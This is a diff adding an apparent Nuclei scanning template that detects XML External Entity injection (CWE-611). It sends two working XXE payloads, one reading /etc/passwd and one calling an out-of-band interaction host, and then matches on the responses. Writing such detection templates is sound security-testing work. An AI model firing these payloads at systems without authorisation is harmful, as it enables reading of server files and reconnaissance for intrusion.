@@ -1,0 +1,56 @@
+id: cwe-611-xxe-detection
+info:
+  name: XML External Entity (XXE) Injection
+  author: security-all-in-one
+  severity: critical
+  description: Tests for XXE injection via XML input
+  classification:
+    cwe-id: CWE-611
+    cvss-score: 9.1
+  tags: xxe,cwe-611,dast,bug-bounty
+
+http:
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+        <root><data>&xxe;</data></root>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "https://{{interactsh-url}}">
+        ]>
+        <root><data>&xxe;</data></root>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
